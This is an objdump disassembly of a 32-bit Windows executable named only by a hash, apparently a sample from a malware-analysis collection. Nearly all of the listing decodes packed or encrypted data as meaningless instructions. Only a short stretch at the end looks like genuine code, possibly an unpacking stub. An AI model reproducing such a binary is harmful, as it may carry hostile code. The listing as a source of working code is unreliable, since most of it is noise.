
521083dc715b997d46b5b3591966b77ba01c749cb375ffb4897637535439ae05.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	push   es
  4d0001:	shr    DWORD PTR [eax],1
  4d0003:	or     BYTE PTR [esi+edi*8],0xe7
  4d0007:	sbb    DWORD PTR [eax+0x6a205675],ebp
  4d000d:	pop    ebp
  4d000e:	pop    es
  4d000f:	sbb    al,0x70
  4d0011:	frstor [esi-0x60]
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d06fc
  4d06c1:	pop    es
  4d06c2:	(bad)  
  4d06c3:	jo     0x4d06f6
  4d06c5:	mov    edi,0x9c4f253b
  4d06ca:	cmp    bl,BYTE PTR [esi-0x1c6a3d3c]
  4d06d0:	mov    BYTE PTR [ebp+ebp*8+0x3c7660d4],bh
  4d06d7:	fidivr DWORD PTR [edx+ebx*4+0x41]
  4d06db:	aad    0x53
  4d06dd:	and    cl,BYTE PTR [edi-0x52dcf3dd]
  4d06e3:	dec    ecx
  4d06e4:	dec    esi
  4d06e5:	cwde   
  4d06e6:	je     0x4d06e6
  4d06e8:	stos   DWORD PTR es:[edi],eax
  4d06e9:	xor    DWORD PTR [ecx],esp
  4d06eb:	sbb    ebx,DWORD PTR [edi-0x1]
  4d06ee:	adc    eax,0x4d2044
  4d06f3:	call   edi
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [edi-0x1],bl
  4d06fa:	adc    eax,0x4d201c
  4d06ff:	call   edi
  4d0701:	add    BYTE PTR [eax],al
  4d0703:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0709:	sub    esp,0x1c
  4d070c:	lea    edi,[ecx+0xec]
  4d0712:	and    DWORD PTR [edi-0xc8],edx
  4d0718:	push   edi
  4d0719:	push   ebx
  4d071a:	push   DWORD PTR [edi+0xac]
  4d0720:	push   DWORD PTR [edi+0xe0]
  4d0726:	call   0x4d1100
  4d072b:	add    esp,0xc
  4d072e:	pop    edi
  4d072f:	push   edi
  4d0730:	push   0x0
  4d0732:	call   0x4d1058
  4d0737:	add    esp,0x4
  4d073a:	pop    edi
  4d073b:	push   edi
  4d073c:	push   0x0
  4d073e:	call   0x4d11cc
  4d0743:	add    esp,0x4
  4d0746:	pop    edi
  4d0747:	add    esp,0x1c
  4d074a:	pop    ebp
  4d074b:	ret    
  4d074c:	mov    edi,edi
  4d074e:	push   ebp
  4d074f:	mov    ebp,esp
  4d0751:	sub    esp,0x60
  4d0754:	add    eax,0xffffffcf
  4d0757:	lea    edx,ds:0x4d3064
  4d075d:	push   edx
  4d075e:	mov    eax,0x6ac
  4d0763:	push   eax
  4d0764:	push   0x6ac
  4d0769:	push   0x40001
  4d076e:	mov    eax,0x862985a6
  4d0773:	push   DWORD PTR [eax+0x7a239a86]
  4d0779:	sub    DWORD PTR [esp],0x2
  4d077d:	mov    eax,0x4d2024
  4d0782:	pop    DWORD PTR [eax]
  4d0784:	call   0x4d154c
  4d0789:	add    esp,0x4
  4d078c:	xchg   DWORD PTR [esp],eax
  4d078f:	mov    edx,eax
  4d0791:	pop    DWORD PTR [edx+0x194]
  4d0797:	mov    ebx,DWORD PTR [edx+0x194]
  4d079d:	lea    esi,[ebx]
  4d079f:	sub    ecx,ecx
  4d07a1:	dec    ecx
  4d07a2:	and    ecx,0x4d0014
  4d07a8:	mov    edi,0xd5d9a824
